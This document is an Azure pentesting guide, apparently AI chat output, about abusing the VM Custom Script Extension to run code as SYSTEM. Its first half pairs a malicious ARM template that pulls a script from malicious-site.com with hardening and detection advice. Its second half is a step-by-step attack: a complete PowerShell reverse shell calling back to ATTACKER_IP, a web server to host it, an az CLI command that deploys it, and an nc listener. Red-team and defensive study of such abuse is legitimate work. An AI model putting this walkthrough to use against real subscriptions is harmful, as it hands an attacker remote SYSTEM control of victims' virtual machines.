# VM Command Execution via Custom Script Extension

**🛠️ Attacking Azure: VM Command Execution via Custom Script Extension**

**Overview**

The **Custom Script Extension** in Azure Virtual Machines allows administrators to run scripts automatically on VM provisioning or update. While it’s a legitimate tool, attackers can abuse it post-compromise to **execute arbitrary code with SYSTEM privileges**, making it a high-value target during lateral movement and privilege escalation.

**🔓 Attack Scenario (Noncompliant Usage)**

An attacker with sufficient privileges (e.g., Contributor role) can deploy a malicious extension to execute commands:

{

"type": "Microsoft.Compute/virtualMachines/extensions",

"name": "CustomScriptExtension",

"apiVersion": "2020-12-01",

"location": "\<vm-location\>",

"properties": {

"publisher": "Microsoft.Compute",

"type": "CustomScriptExtension",

"typeHandlerVersion": "1.10",

"autoUpgradeMinorVersion": true,

"settings": {

"fileUris": \["https://malicious-site.com/malicious-script.ps1"\],

"commandToExecute": "powershell.exe -ExecutionPolicy Bypass -File malicious-script.ps1"

}

}

}

🔸 **Red Team Insight**:\
This method executes unverified scripts as SYSTEM, effectively giving the attacker full control of the VM without needing RDP or SSH access.

**🔐 Defensive Best Practice (Compliant Usage)**

To reduce abuse, organizations should enforce script integrity, restrict sources, and securely pass secrets:

{

"type": "Microsoft.Compute/virtualMachines/extensions",

"name": "CustomScriptExtension",

"apiVersion": "2020-12-01",

"location": "\<vm-location\>",

"properties": {

"publisher": "Microsoft.Compute",

"type": "CustomScriptExtension",

"typeHandlerVersion": "1.10",

"autoUpgradeMinorVersion": true,

"settings": {

"fileUris": \["https://secure-site.com/secure-script.ps1"\],

"commandToExecute": "powershell.exe -ExecutionPolicy RemoteSigned -File secure-script.ps1"

},

"protectedSettings": {

"storageAccountName": "\<storage-account-name\>",

"storageAccountKey": "\<storage-account-key\>"

}

}

}

🛡️ **Security Controls to Implement**:

- Restrict who can use VM extensions via **Azure RBAC**.

- Enable **Azure Policy** to block execution from untrusted sources.

- Use **RemoteSigned** or **AllSigned** PowerShell execution policies.

- Monitor extension deployments using **Azure Defender for Servers** or **Log Analytics**.

**🧪 PenTest Takeaway**

Custom Script Extension abuse is a stealthy method to execute post-exploitation payloads. During an Azure assessment:

- Look for permissions to deploy or modify VM extensions.

- Use az vm extension set or ARM templates to simulate malicious deployment.

- Monitor for artifacts like unexpected scripts, base64 PowerShell in logs, or extensions with suspicious URLs.

✅ **Key Detection Point**:\
Alert on Microsoft.Compute/virtualMachines/extensions/write operations in activity logs combined with public or unknown script sources.

Would you like a command-line walkthrough of exploiting this using az CLI and crafting a test ARM template?

Great — here's a **step-by-step walkthrough** of abusing the **Custom Script Extension** to execute commands on an Azure VM using the az CLI. This simulates a post-compromise scenario where you've obtained **Contributor** or similar privileges.

**🎯 Objective**

Run a PowerShell reverse shell (or arbitrary command) on a target Azure VM by deploying a malicious Custom Script Extension.

**🧰 Prerequisites**

- az CLI authenticated to the target tenant/subscription.

- Role with Microsoft.Compute/virtualMachines/extensions/write (e.g., Contributor or VM Contributor).

- VM name and resource group.

- Optionally, a web server to host your malicious script (e.g., Python HTTP server or Azure Blob URL).

**🪝 Step 1: Create the Malicious Script**

Create a basic reverse shell PowerShell script (example for educational purposes):

\# reverse.ps1

\$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP", ATTACKER_PORT)

\$stream = \$client.GetStream()

\[byte\[\]\]\$bytes = 0..65535\|%{0}

while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){

\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i)

\$sendback = (Invoke-Expression -Command \$data 2\>&1 \| Out-String )

\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '\> '

\$sendbyte = (\[text.encoding\]::ASCII).GetBytes(\$sendback2)

\$stream.Write(\$sendbyte,0,\$sendbyte.Length)

\$stream.Flush()

}

\$client.Close()

Start a Python web server in the script directory:

python3 -m http.server 8000

**⚙️ Step 2: Deploy Custom Script Extension via az**

Replace the placeholders below and run:

az vm extension set \\

--resource-group \<RESOURCE_GROUP\> \\

--vm-name \<VM_NAME\> \\

--name CustomScriptExtension \\

--publisher Microsoft.Compute \\

--version 1.10 \\

--settings '{"fileUris": \["http://YOUR-IP:8000/reverse.ps1"\], "commandToExecute": "powershell.exe -ExecutionPolicy Bypass -File reverse.ps1"}'

📌 This will **execute reverse.ps1 as SYSTEM** on the target Windows VM.

**🧼 Step 3: Catch the Shell**

Start a listener on your attacking machine:

nc -lvnp \<ATTACKER_PORT\>

Once the extension runs, the VM will connect back to your listener and provide a shell.

**🔐 Cleanup (Optional for Blue Team Ops)**

To clean up the extension:

az vm extension delete \\

--resource-group \<RESOURCE_GROUP\> \\

--vm-name \<VM_NAME\> \\

--name CustomScriptExtension

**🧠 Notes for PenTest Reports**

- Log activity in AzureActivity logs under Microsoft.Compute/virtualMachines/extensions/write

- Potential impact: SYSTEM-level code execution, lateral movement, persistence

- Mitigations: Least privilege RBAC, deny policy on Custom Script Extension, trusted script hosting

Would you like a Linux variant, or an ARM template version for red team automation?
